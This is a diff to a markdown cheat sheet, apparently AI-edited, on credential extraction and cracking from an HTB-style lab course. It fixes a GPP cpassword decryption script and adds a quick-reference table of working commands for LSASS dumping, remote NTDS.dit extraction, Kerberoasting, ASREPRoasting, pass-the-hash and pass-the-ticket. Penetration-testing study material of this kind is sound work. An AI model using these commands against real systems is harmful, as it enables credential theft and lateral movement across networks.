@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Extract, capture, and crack credentials from Windows and Linux systems. Windows: SAM/LSASS/NTDS.dit hash extraction, Pass-the-Hash (PTH), Pass-the-Ticket (PTT). Linux: harvesting from configs, history, and memory. Network captures for cleartext creds. Offline cracking with hashcat and john.
+Extract, capture, and crack credentials from Windows and Linux systems. Windows: SAM/LSASS/NTDS.dit hash extraction, Pass-the-Hash (PTH), Pass-the-Ticket (PTT). Linux: harvesting from configs, history, and memory. Network captures for cleartext creds. Offline cracking with hashcat and john. Pairs with [[Login Brute Forcing]], [[Windows Priv Esc]], [[Pivoting, Tunneling & Port Forwarding]].
 
 ---
 
@@ -354,14 +354,20 @@ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 # Manual — mount SYSVOL or enumerate via SMB
 find /mnt/sysvol -name "*.xml" 2>/dev/null | xargs grep -l "cpassword" 2>/dev/null
 
-# Decrypt cpassword (Python)
+# Decrypt cpassword — easiest is the built-in tool:
+gpp-decrypt 'CPASSWORD_VALUE'
+
+# Manual (Python) — GPP uses a FIXED NULL IV, the whole blob is ciphertext, and the
+# plaintext is UTF-16LE (common mistakes: using enc[:16] as IV / decoding as UTF-8):
 python3 -c "
 import base64
 from Crypto.Cipher import AES
 key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
-enc = base64.b64decode('CPASSWORD_VALUE' + '=' * (4 - len('CPASSWORD_VALUE') % 4))
-cipher = AES.new(key, AES.MODE_CBC, enc[:16])
-print(cipher.decrypt(enc[16:]).rstrip(b'\\x08').decode())
+b64 = 'CPASSWORD_VALUE'
+enc = base64.b64decode(b64 + '=' * ((4 - len(b64) % 4) % 4))
+pt = AES.new(key, AES.MODE_CBC, b'\x00'*16).decrypt(enc)
+pt = pt[:-pt[-1]]                      # strip PKCS7 padding
+print(pt.decode('utf-16-le'))
 "
 
 # Windows — PowerSploit
@@ -417,8 +423,8 @@ for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
   find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"
 done
 
-# Text files in home dirs
-find /home/* -type f -name "*.txt" -o ! -name "*.*"
+# Text files in home dirs (group the -o branches so -type f applies to both)
+find /home/ -type f \( -name "*.txt" -o ! -name "*.*" \)
 ```
 
 ### Bash / Shell History
@@ -533,8 +539,8 @@ python3.9 firefox_decrypt.py
 | Prefix | Algorithm |
 |---|---|
 | `$1$` | MD5 |
-| `$2a$` | Blowfish |
-| `$2y$` | Eksblowfish |
+| `$2a$` / `$2b$` | bcrypt |
+| `$2y$` | bcrypt (PHP variant; Eksblowfish-based) |
 | `$5$` | SHA-256 |
 | `$6$` | SHA-512 |
 
@@ -817,6 +823,31 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 
 ---
 
+## Quick Reference
+
+| Goal | Command |
+|---|---|
+| Crack NTLM hash | `hashcat -m 1000 hashes.txt rockyou.txt` |
+| Crack /etc/shadow | `unshadow passwd.bak shadow.bak > unshadowed.hashes; hashcat -m 1800 unshadowed.hashes rockyou.txt` |
+| Dump SAM (offline) | `impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL` |
+| Dump LSASS via minidump | `rundll32 comsvcs.dll, MiniDump <PID> C:\lsass.dmp full` then `pypykatz lsa minidump lsass.dmp` |
+| Dump NTDS.dit remotely | `crackmapexec smb 10.129.201.57 -u Administrator -p 'Password123' --ntds` |
+| Kerberoast | `impacket-GetUserSPNs domain.htb/user:pass -dc-ip <IP> -request -outputfile kb.txt` → `hashcat -m 13100 kb.txt rockyou.txt` |
+| ASREPRoast | `impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt -format hashcat` → `hashcat -m 18200` |
+| GPP cpassword decrypt | `gpp-decrypt 'CPASSWORD_VALUE'` |
+| Pass the Hash (Linux) | `impacket-psexec administrator@<IP> -hashes :<NTLM_HASH>` |
+| Pass the Hash (mimikatz) | `sekurlsa::pth /domain:X /user:Y /ntlm:<hash> /run:cmd` |
+| Pass the Ticket (Rubeus) | `Rubeus.exe ptt /ticket:<file>.kirbi` |
+| OverPass the Hash → TGT | `Rubeus.exe asktgt /domain:X /user:Y /aes256:<key> /nowrap` |
+| Extract Firefox saved creds | `python3.9 firefox_decrypt.py` |
+| DPAPI masterkey decrypt | `impacket-dpapi masterkey -file MasterKey -password 'pass'` |
+| Crack password-protected file | `office2john file.docx > f.hash; john f.hash --wordlist=rockyou.txt` |
+| Crack KeePass DB | `keepass2john database.kdbx > kp.hash; hashcat -m 13400 kp.hash rockyou.txt` |
+| Extract creds from pcap | `python3 /opt/PCredz/Pcredz -f capture.pcap` |
+| Linux memory cred dump | `sudo python3 mimipenguin.py` |
+
+---
+
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
